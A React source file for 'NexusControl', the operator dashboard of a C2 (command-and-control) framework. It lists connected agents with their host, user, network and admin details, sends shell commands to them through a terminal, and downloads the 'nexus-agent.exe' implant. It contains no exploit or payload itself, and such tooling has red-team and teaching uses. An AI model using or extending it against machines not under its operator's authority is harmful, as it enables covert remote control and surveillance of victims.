"use client"
import { useState, useEffect, useRef, useCallback } from "react"
import {
  Bot,
  RefreshCw,
  Edit,
  Cpu,
  Network,
  Shield,
  Plus,
  AlertTriangle,
  Check,
  LayoutDashboard,
  Download,
  Copy,
  Clock,
  Github,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import { Badge } from "@/components/ui/badge"
import { Dialog, DialogContent, DialogFooter, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { ScrollArea } from "@/components/ui/scroll-area"
import { useToast } from "@/hooks/use-toast"
import {
  SidebarProvider,
  Sidebar,
  SidebarHeader,
  SidebarContent,
  SidebarMenu,
  SidebarMenuItem,
  SidebarMenuButton,
  SidebarInset,
  SidebarFooter,
  SidebarGroup,
  SidebarGroupLabel,
  SidebarGroupContent,
  SidebarTrigger,
} from "@/components/ui/sidebar"
import { Terminal } from "@/components/terminal"
import { ServerStatusIndicator } from "@/components/server-status-indicator"
import { ServerDashboard } from "@/components/server-dashboard"
import { Separator } from "@/components/ui/separator"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"

const API_BASE_URL = "http://127.0.0.1:8000"

const SERVER_STATS_INTERVAL = 30000 // 30 seconds
const LOGS_INTERVAL = 20000 // 20 seconds
const AGENTS_INTERVAL = 15000 // 15 seconds

type AgentData = {
  agent_id: string
  name: string
  connection_time: string
  host: string
  port: string
  status: boolean
  hostname: string
  cwd: string
  os_name: string
  os_version: string
  os_architecture: string
  local_ip: string
  public_ip: string
  mac_address: string
  is_admin: boolean
  username: string
}

type AgentResponse = {
  status: boolean
  command_response?: string | null
  cwd?: string | null
}

type ServerStatus = "running" | "stopped" | "starting" | "stopping" | "unknown"

type ServerStatusResponse = {
  is_running: boolean
  port: number
  host: string
}

type ServerStats = {
  hostname: string
  local_ip: string
  public_ip: string
  mac_address: string
  cpu_usage: number
  memory_usage: number
  network_download_kbps: number
  network_upload_kbps: number
  encryption: boolean
  os_name: string
  os_version: string
  os_architecture: string
  server_time: string
  server_start_time: string
}

type LogEntry = {
  timestamp: string
  event_type: string
  message: string
}

export default function Dashboard() {
  const [agents, setAgents] = useState<AgentData[]>([])
  const [selectedAgentId, setSelectedAgentId] = useState<string>("")
  const [newAgentName, setNewAgentName] = useState("")
  const [isRefreshing, setIsRefreshing] = useState(false)
  const [isDialogOpen, setIsDialogOpen] = useState(false)
  const [serverStatus, setServerStatus] = useState<ServerStatus>("unknown")
  const [serverInfo, setServerInfo] = useState<ServerStatusResponse | null>(null)
  const [serverStats, setServerStats] = useState<ServerStats | null>(null)
  const [logs, setLogs] = useState<LogEntry[]>([])
  const [activeTab, setActiveTab] = useState("dashboard")
  const [isCopied, setIsCopied] = useState(false)
  const [isDownloading, setIsDownloading] = useState(false)
  const [isInitialLoading, setIsInitialLoading] = useState(true)
  const [lastUpdateTime, setLastUpdateTime] = useState<Date>(new Date())

  const statsUpdateIntervalRef = useRef<NodeJS.Timeout | null>(null)
  const logsUpdateIntervalRef = useRef<NodeJS.Timeout | null>(null)
  const agentsUpdateIntervalRef = useRef<NodeJS.Timeout | null>(null)
  const downloadLinkRef = useRef<HTMLInputElement>(null)

  const { toast } = useToast()

  const onlineAgents = agents.filter((agent) => agent.status)
  const selectedAgent = agents.find((agent) => agent.agent_id === selectedAgentId)

  const apiCall = async (endpoint: string, options: RequestInit = {}) => {
    try {
      const response = await fetch(`${API_BASE_URL}${endpoint}`, {
        headers: { "Content-Type": "application/json", ...options.headers },
        ...options,
      })
      if (!response.ok) throw new Error(`API Error: ${response.status}`)
      return await response.json()
    } catch (error) {
      console.error("API call failed:", error)
      if (!isInitialLoading) {
        toast({
          title: "API Error",
          description: error instanceof Error ? error.message : "Unknown error",
          variant: "destructive",
        })
      }
      throw error
    }
  }

  const fetchServerStatus = async () => {
    try {
      const data: ServerStatusResponse = await apiCall("/server/status")
      setServerStatus(data.is_running ? "running" : "stopped")
      setServerInfo(data)
      return data.is_running
    } catch {
      setServerStatus("unknown")
      setServerInfo(null)
      return false
    }
  }

  const fetchServerStats = async () => {
    try {
      const data: ServerStats = await apiCall("/server/stats")
      setServerStats(data)
    } catch {
      setServerStats(null)
    }
  }

  const fetchAgents = async () => {
    try {
      const data: AgentData[] = await apiCall("/agents")
      setAgents(data)

      // Only auto-select first agent if no agent is currently selected
      if (!selectedAgentId && data.length > 0) {
        setSelectedAgentId(data[0].agent_id)
      }
      // Keep the current selection even if the agent is offline or disconnected
      // This prevents switching agents while user is working with a specific agent
    } catch {
      setAgents([])
    }
  }

  const fetchLogs = async () => {
    try {
      const data: LogEntry[] = await apiCall("/logs?limit=50")
      setLogs(data.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()))
    } catch {
      setLogs([])
    }
  }

  const sendCommand = async (agentId: string, command: string): Promise<AgentResponse> => {
    return await apiCall(
      `/agents/interaction?agent_id=${encodeURIComponent(agentId)}&command=${encodeURIComponent(command)}`,
      { method: "POST" },
    )
  }

  const statsUpdate = useCallback(async () => {
    if (serverStatus === "running") {
      try {
        await fetchServerStats()
        setLastUpdateTime(new Date())
      } catch (error) {
        console.error("Stats update failed:", error)
      }
    }
  }, [serverStatus])

  const logsUpdate = useCallback(async () => {
    if (serverStatus === "running") {
      try {
        await fetchLogs()
      } catch (error) {
        console.error("Logs update failed:", error)
      }
    }
  }, [serverStatus])

  const agentsUpdate = useCallback(async () => {
    if (serverStatus === "running") {
      try {
        await fetchAgents()
      } catch (error) {
        console.error("Agents update failed:", error)
      }
    }
  }, [serverStatus, selectedAgentId])

  const initializeData = async () => {
    setIsInitialLoading(true)
    try {
      const isRunning = await fetchServerStatus()
      if (isRunning) {
        await Promise.all([fetchServerStats(), fetchAgents(), fetchLogs()])
      }
    } catch (error) {
      console.error("Failed to initialize:", error)
    } finally {
      setIsInitialLoading(false)
      setLastUpdateTime(new Date())
    }
  }

  const startServer = async () => {
    try {
      setServerStatus("starting")
      await apiCall("/server/control?action=start", { method: "POST" })
      await fetchServerStatus()
      toast({ title: "Server Started", description: "The C2 server is now running." })
    } catch {
      setServerStatus("stopped")
    }
  }

  const stopServer = async () => {
    try {
      setServerStatus("stopping")
      await apiCall("/server/control?action=stop", { method: "POST" })
      await fetchServerStatus()
      setServerStats(null)
      setAgents([])
      setLogs([])
      toast({ title: "Server Stopped", description: "The C2 server has been stopped." })
    } catch {
      setServerStatus("running")
    }
  }

  const updateAgentName = async () => {
    if (!selectedAgent || !newAgentName.trim()) return
    try {
      await apiCall(`/agents/${selectedAgent.agent_id}?name=${encodeURIComponent(newAgentName)}`, { method: "POST" })
      await fetchAgents()
      setIsDialogOpen(false)
      setNewAgentName("")
      toast({ title: "Agent Updated", description: "Agent name updated successfully." })
    } catch {
      toast({ title: "Error", description: "Failed to update agent name.", variant: "destructive" })
    }
  }

  const refreshAgentData = async () => {
    if (!selectedAgent) return
    setIsRefreshing(true)
    try {
      await fetchAgents()
    } finally {
      setIsRefreshing(false)
    }
  }

  const refreshAllAgents = async () => {
    setIsRefreshing(true)
    try {
      await fetchAgents()
      toast({ title: "Agents Refreshed", description: "Connected agents list updated." })
    } catch {
      toast({ title: "Refresh Failed", description: "Failed to refresh agents.", variant: "destructive" })
    } finally {
      setIsRefreshing(false)
    }
  }

  const calculateUptime = () => {
    if (!serverStats?.server_start_time || serverStatus !== "running") return "00h 00m"
    const uptimeMs = new Date().getTime() - new Date(serverStats.server_start_time).getTime()
    const hours = Math.floor(uptimeMs / 3600000)
    const minutes = Math.floor((uptimeMs % 3600000) / 60000)
    return `${hours.toString().padStart(2, "0")}h ${minutes.toString().padStart(2, "0")}m`
  }

  const calculateConnectionUptime = (connectionTime: string) => {
    const uptimeMs = new Date().getTime() - new Date(connectionTime).getTime()
    const hours = Math.floor(uptimeMs / 3600000)
    const minutes = Math.floor((uptimeMs % 3600000) / 60000)
    return hours > 0 ? `${hours}h ${minutes}m` : `${minutes}m`
  }

  const getConnectionTimeAgo = (connectionTime: string) => {
    const timeDiff = new Date().getTime() - new Date(connectionTime).getTime()
    const hours = Math.floor(timeDiff / 3600000)
    const minutes = Math.floor((timeDiff % 3600000) / 60000)
    const seconds = Math.floor((timeDiff % 60000) / 1000)
    if (hours > 0) return `${hours}h ${minutes}m ago`
    if (minutes > 0) return `${minutes}m ${seconds}s ago`
    return `${seconds}s ago`
  }

  const handleDownloadAgent = async () => {
    if (serverStatus !== "running") {
      toast({ title: "Server Not Running", variant: "destructive" })
      return
    }
    setIsDownloading(true)
    try {
      const response = await fetch(`${API_BASE_URL}/agent/download`)
      if (!response.ok) throw new Error("Download failed")
      const blob = await response.blob()
      const url = window.URL.createObjectURL(blob)
      const a = document.createElement("a")
      a.href = url
      a.download = "nexus-agent.exe"
      document.body.appendChild(a)
      a.click()
      window.URL.revokeObjectURL(url)
      document.body.removeChild(a)
      toast({ title: "Download Started" })
    } catch {
      toast({ title: "Download Failed", variant: "destructive" })
    } finally {
      setIsDownloading(false)
    }
  }

  const handleCopyLink = () => {
    if (downloadLinkRef.current) {
      downloadLinkRef.current.select()
      document.execCommand("copy")
      setIsCopied(true)
      toast({ title: "Link Copied" })
      setTimeout(() => setIsCopied(false), 2000)
    }
  }

  // Setup polling intervals with optimized timing
  useEffect(() => {
    if (statsUpdateIntervalRef.current) clearInterval(statsUpdateIntervalRef.current)
    if (logsUpdateIntervalRef.current) clearInterval(logsUpdateIntervalRef.current)
    if (agentsUpdateIntervalRef.current) clearInterval(agentsUpdateIntervalRef.current)

    if (serverStatus === "running") {
      statsUpdateIntervalRef.current = setInterval(statsUpdate, SERVER_STATS_INTERVAL)
      logsUpdateIntervalRef.current = setInterval(logsUpdate, LOGS_INTERVAL)
      agentsUpdateIntervalRef.current = setInterval(agentsUpdate, AGENTS_INTERVAL)
    }

    return () => {
      if (statsUpdateIntervalRef.current) clearInterval(statsUpdateIntervalRef.current)
      if (logsUpdateIntervalRef.current) clearInterval(logsUpdateIntervalRef.current)
      if (agentsUpdateIntervalRef.current) clearInterval(agentsUpdateIntervalRef.current)
    }
  }, [serverStatus, statsUpdate, logsUpdate, agentsUpdate])

  useEffect(() => {
    initializeData()
    // Only check server status occasionally since server rarely stops
    const statusCheckInterval = setInterval(async () => {
      if (serverStatus !== "running") await fetchServerStatus()
    }, 10000) // Check every 10 seconds instead of 5
    return () => clearInterval(statusCheckInterval)
  }, [])

  if (isInitialLoading) {
    return (
      <div className="flex items-center justify-center min-h-screen">
        <div className="flex flex-col items-center space-y-4">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary"></div>
          <p className="text-muted-foreground">Loading NexusControl...</p>
        </div>
      </div>
    )
  }

  return (
    <SidebarProvider>
      <Sidebar collapsible="icon">
        <SidebarHeader>
          <SidebarMenu>
            <SidebarMenuItem>
              <SidebarMenuButton size="lg">
                <div className="flex aspect-square size-8 items-center justify-center rounded-lg bg-sidebar-primary text-sidebar-primary-foreground">
                  <Shield className="size-4" />
                </div>
                <div className="grid flex-1 text-left text-sm leading-tight">
                  <span className="truncate font-semibold">NexusControl</span>
                  <span className="truncate text-xs">Remote command and control</span>
                </div>
              </SidebarMenuButton>
            </SidebarMenuItem>
          </SidebarMenu>
        </SidebarHeader>

        <SidebarContent>
          <SidebarGroup>
            <SidebarGroupContent>
              <SidebarMenu>
                <SidebarMenuItem>
                  <SidebarMenuButton isActive={activeTab === "dashboard"} onClick={() => setActiveTab("dashboard")}>
                    <LayoutDashboard className="h-4 w-4" />
                    <span>Dashboard</span>
                  </SidebarMenuButton>
                </SidebarMenuItem>
              </SidebarMenu>
            </SidebarGroupContent>
          </SidebarGroup>

          {serverStatus === "running" && (
            <SidebarGroup>
              <div className="flex items-center justify-between px-2 mb-2">
                <SidebarGroupLabel>Connected Agents ({onlineAgents.length})</SidebarGroupLabel>
                <div className="flex items-center space-x-1">
                  <TooltipProvider>
                    <Tooltip>
                      <TooltipTrigger asChild>
                        <Button
                          variant="ghost"
                          size="icon"
                          className="h-7 w-7 rounded-full group-data-[collapsible=icon]:hidden"
                          onClick={refreshAllAgents}
                          disabled={isRefreshing}
                        >
                          <RefreshCw className={`h-4 w-4 ${isRefreshing ? "animate-spin" : ""}`} />
                        </Button>
                      </TooltipTrigger>
                      <TooltipContent>Refresh Agents</TooltipContent>
                    </Tooltip>
                  </TooltipProvider>
                </div>
              </div>
              <SidebarGroupContent>
                <ScrollArea className="h-[200px]">
                  <SidebarMenu>
                    {agents.map((agent) => (
                      <SidebarMenuItem key={agent.agent_id}>
                        <SidebarMenuButton
                          isActive={activeTab === "agents" && selectedAgentId === agent.agent_id}
                          onClick={() => {
                            setSelectedAgentId(agent.agent_id)
                            setActiveTab("agents")
                          }}
                        >
                          <Bot className="h-4 w-4" />
                          <div className="flex flex-col items-start min-w-0 flex-1">
                            <span className="truncate text-sm font-medium">{agent.name}</span>
                            <div className="flex items-center space-x-2 text-xs text-muted-foreground group-data-[collapsible=icon]:hidden">
                              <Clock className="h-3 w-3" />
                              <span>{getConnectionTimeAgo(agent.connection_time)}</span>
                            </div>
                          </div>
                          <div
                            className={`ml-auto h-2 w-2 rounded-full ${agent.status ? "bg-green-500" : "bg-red-500"}`}
                          ></div>
                        </SidebarMenuButton>
                      </SidebarMenuItem>
                    ))}
                    {agents.length === 0 && (
                      <div className="px-2 py-3 text-xs text-muted-foreground">
                        <span className="group-data-[collapsible=icon]:hidden">No agents connected</span>
                      </div>
                    )}
                  </SidebarMenu>
                </ScrollArea>
              </SidebarGroupContent>
            </SidebarGroup>
          )}
        </SidebarContent>

        <SidebarFooter>
          <SidebarMenu>
            {serverStatus === "running" && (
              <SidebarMenuItem>
                <div className="border border-border rounded-md p-2 bg-sidebar-accent/20 group-data-[collapsible=icon]:hidden">
                  <ServerStatusIndicator status={serverStatus} info={serverInfo} />
                  <div className="mt-2 text-xs text-muted-foreground">
                    Last update: {lastUpdateTime.toLocaleTimeString()}
                  </div>
                </div>
              </SidebarMenuItem>
            )}
            {activeTab === "agents" && selectedAgent && (
              <SidebarMenuItem>
                <div className="flex items-center justify-between border border-border rounded-md p-2 bg-sidebar-accent/20 group-data-[collapsible=icon]:hidden">
                  <div className="flex items-center space-x-2">
                    <div
                      className={`h-2 w-2 rounded-full ${selectedAgent.status ? "bg-green-500" : "bg-red-500"}`}
                    ></div>
                    <span className="text-xs font-medium">{selectedAgent.name}</span>
                  </div>
                  <Button variant="outline" size="sm" onClick={refreshAgentData} disabled={isRefreshing}>
                    <RefreshCw className={`h-4 w-4 ${isRefreshing ? "animate-spin" : ""}`} />
                  </Button>
                </div>
              </SidebarMenuItem>
            )}
            <SidebarMenuItem>
              <div className="group-data-[collapsible=icon]:hidden">
                <a
                  href="https://github.com/galshichrur"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="flex items-center justify-center space-x-2 text-xs text-muted-foreground hover:text-foreground transition-colors p-2"
                >
                  <Github className="h-4 w-4" />
                  <span>@galshichrur</span>
                </a>
              </div>
            </SidebarMenuItem>
          </SidebarMenu>
        </SidebarFooter>
      </Sidebar>

      <SidebarInset>
        <header className="flex h-16 shrink-0 items-center gap-2">
          <div className="flex items-center gap-2 px-4">
            <SidebarTrigger className="-ml-1" />
            <Separator orientation="vertical" className="mr-2 h-4" />
            <Badge variant={serverStatus === "running" ? "default" : "destructive"} className="px-2 py-0.5">
              {serverStatus === "running" && "Server Online"}
              {serverStatus === "stopped" && "Server Offline"}
              {serverStatus === "starting" && "Starting..."}
              {serverStatus === "stopping" && "Stopping..."}
              {serverStatus === "unknown" && "Unknown"}
            </Badge>
            {serverStatus === "running" && (
              <div className="flex items-center space-x-1 text-xs text-muted-foreground">
                <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                <span>Auto-updating</span>
              </div>
            )}
          </div>
        </header>

        <div className="flex flex-1 flex-col gap-4 p-4 pt-0">
          {activeTab === "dashboard" ? (
            <ServerDashboard
              serverStatus={serverStatus}
              serverInfo={serverInfo}
              serverStats={serverStats}
              logs={logs}
              onStartServer={startServer}
              onStopServer={stopServer}
              connectedBots={onlineAgents.length}
              uptime={calculateUptime()}
            />
          ) : activeTab === "agents" && selectedAgent ? (
            <>
              <div className="flex items-center justify-between">
                <div>
                  <h2 className="text-3xl font-bold tracking-tight">{selectedAgent.name}</h2>
                  <div className="grid grid-cols-2 gap-x-8 gap-y-1 mt-2">
                    <p className="text-sm text-muted-foreground">
                      ID: <span className="text-foreground">{selectedAgent.agent_id}</span>
                    </p>
                    <p className="text-sm text-muted-foreground">
                      Hostname: <span className="text-foreground">{selectedAgent.hostname}</span>
                    </p>
                    <p className="text-sm text-muted-foreground">
                      Username: <span className="text-foreground">{selectedAgent.username}</span>
                    </p>
                    <p className="text-sm text-muted-foreground">
                      Local IP: <span className="text-foreground">{selectedAgent.local_ip}</span>
                    </p>
                    <p className="text-sm text-muted-foreground">
                      Public IP: <span className="text-foreground">{selectedAgent.public_ip}</span>
                    </p>
                    <p className="text-sm text-muted-foreground">
                      Connected:{" "}
                      <span className="text-foreground">{getConnectionTimeAgo(selectedAgent.connection_time)}</span>
                    </p>
                  </div>
                </div>

                <div className="flex items-center space-x-2">
                  <Dialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
                    <DialogTrigger asChild>
                      <Button variant="outline" size="sm">
                        <Edit className="h-4 w-4 mr-2" />
                        Edit Name
                      </Button>
                    </DialogTrigger>
                    <DialogContent>
                      <DialogHeader>
                        <DialogTitle>Edit Agent Name</DialogTitle>
                      </DialogHeader>
                      <div className="py-4">
                        <Label htmlFor="agentName">Agent Name</Label>
                        <Input
                          id="agentName"
                          value={newAgentName || selectedAgent.name}
                          onChange={(e) => setNewAgentName(e.target.value)}
                          className="mt-2"
                        />
                      </div>
                      <DialogFooter>
                        <Button variant="outline" onClick={() => setIsDialogOpen(false)}>
                          Cancel
                        </Button>
                        <Button onClick={updateAgentName}>Save</Button>
                      </DialogFooter>
                    </DialogContent>
                  </Dialog>

                  <Button onClick={refreshAgentData} disabled={isRefreshing || !selectedAgent.status}>
                    <RefreshCw className={`h-4 w-4 mr-2 ${isRefreshing ? "animate-spin" : ""}`} />
                    Refresh
                  </Button>
                </div>
              </div>

              {!selectedAgent.status && (
                <Card className="border-red-500/50 bg-red-500/5">
                  <CardHeader>
                    <CardTitle className="flex items-center text-red-500">
                      <AlertTriangle className="h-5 w-5 mr-2" />
                      Agent Offline
                    </CardTitle>
                    <CardDescription>This agent is currently offline.</CardDescription>
                  </CardHeader>
                  <CardContent>
                    <p>Last connected: {new Date(selectedAgent.connection_time).toLocaleString()}</p>
                    <Button className="mt-4 bg-transparent" variant="outline" size="sm" onClick={refreshAgentData}>
                      Check Status
                    </Button>
                  </CardContent>
                </Card>
              )}

              <div className="grid gap-4 md:grid-cols-3">
                <Card>
                  <CardHeader className="pb-2">
                    <CardTitle className="text-sm font-medium">Status</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="text-2xl font-bold">{selectedAgent.status ? "Online" : "Offline"}</div>
                    <Badge variant={selectedAgent.status ? "default" : "destructive"} className="mt-2">
                      {selectedAgent.status ? "Connected" : "Disconnected"}
                    </Badge>
                  </CardContent>
                </Card>

                <Card>
                  <CardHeader className="pb-2">
                    <CardTitle className="text-sm font-medium">Connection Time</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="text-2xl font-bold">{calculateConnectionUptime(selectedAgent.connection_time)}</div>
                    <p className="text-xs text-muted-foreground mt-2">Since connection</p>
                  </CardContent>
                </Card>

                <Card>
                  <CardHeader className="pb-2">
                    <CardTitle className="text-sm font-medium">Admin Rights</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="text-2xl font-bold">{selectedAgent.is_admin ? "Yes" : "No"}</div>
                    <Badge variant={selectedAgent.is_admin ? "default" : "secondary"} className="mt-2">
                      {selectedAgent.is_admin ? "Administrator" : "User"}
                    </Badge>
                  </CardContent>
                </Card>
              </div>

              <Tabs defaultValue="system">
                <TabsList className="grid w-full grid-cols-3">
                  <TabsTrigger value="system">System</TabsTrigger>
                  <TabsTrigger value="network">Network</TabsTrigger>
                  <TabsTrigger value="terminal">Terminal</TabsTrigger>
                </TabsList>

                <TabsContent value="system">
                  <Card>
                    <CardHeader>
                      <CardTitle className="flex items-center">
                        <Cpu className="h-5 w-5 mr-2" />
                        System Information
                      </CardTitle>
                    </CardHeader>
                    <CardContent>
                      <div className="grid gap-4 md:grid-cols-2">
                        <div>
                          <h3 className="text-sm text-muted-foreground mb-1">Operating System</h3>
                          <p>
                            {selectedAgent.os_name} {selectedAgent.os_version}
                          </p>
                        </div>
                        <div>
                          <h3 className="text-sm text-muted-foreground mb-1">Architecture</h3>
                          <p>{selectedAgent.os_architecture}</p>
                        </div>
                        <div>
                          <h3 className="text-sm text-muted-foreground mb-1">Current Directory</h3>
                          <p>{selectedAgent.cwd}</p>
                        </div>
                        <div>
                          <h3 className="text-sm text-muted-foreground mb-1">Connection Time</h3>
                          <p>{new Date(selectedAgent.connection_time).toLocaleString()}</p>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                </TabsContent>

                <TabsContent value="network">
                  <Card>
                    <CardHeader>
                      <CardTitle className="flex items-center">
                        <Network className="h-5 w-5 mr-2" />
                        Network Information
                      </CardTitle>
                    </CardHeader>
                    <CardContent>
                      <Table>
                        <TableHeader>
                          <TableRow>
                            <TableHead>Property</TableHead>
                            <TableHead>Value</TableHead>
                          </TableRow>
                        </TableHeader>
                        <TableBody>
                          <TableRow>
                            <TableCell>Local IP</TableCell>
                            <TableCell>{selectedAgent.local_ip}</TableCell>
                          </TableRow>
                          <TableRow>
                            <TableCell>Public IP</TableCell>
                            <TableCell>{selectedAgent.public_ip}</TableCell>
                          </TableRow>
                          <TableRow>
                            <TableCell>MAC Address</TableCell>
                            <TableCell>{selectedAgent.mac_address}</TableCell>
                          </TableRow>
                          <TableRow>
                            <TableCell>Host</TableCell>
                            <TableCell>{selectedAgent.host}</TableCell>
                          </TableRow>
                          <TableRow>
                            <TableCell>Port</TableCell>
                            <TableCell>{selectedAgent.port}</TableCell>
                          </TableRow>
                        </TableBody>
                      </Table>
                    </CardContent>
                  </Card>
                </TabsContent>

                <TabsContent value="terminal">
                  <Terminal
                    agent={selectedAgent}
                    isOnline={selectedAgent.status}
                    onSendCommand={sendCommand}
                    onReconnect={refreshAgentData}
                  />
                </TabsContent>
              </Tabs>
            </>
          ) : null}
        </div>
      </SidebarInset>

    </SidebarProvider>
  )
}
